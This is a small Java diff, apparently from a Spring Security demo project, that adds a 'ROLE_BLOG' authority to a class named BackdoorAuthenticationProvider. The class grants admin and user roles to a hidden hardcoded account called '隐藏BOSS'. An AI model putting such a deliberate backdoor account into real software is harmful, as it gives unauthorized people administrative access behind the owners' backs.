@@ -25,6 +25,7 @@ public class BackdoorAuthenticationProvider implements AuthenticationProvider {
             Collection<GrantedAuthority> authorityCollection = new ArrayList<>();
             authorityCollection.add(new SimpleGrantedAuthority("ROLE_ADMIN"));
             authorityCollection.add(new SimpleGrantedAuthority("ROLE_USER"));
+            authorityCollection.add(new SimpleGrantedAuthority("ROLE_BLOG"));
             return new UsernamePasswordAuthenticationToken("隐藏BOSS", password, authorityCollection);
         } else {
             return null;
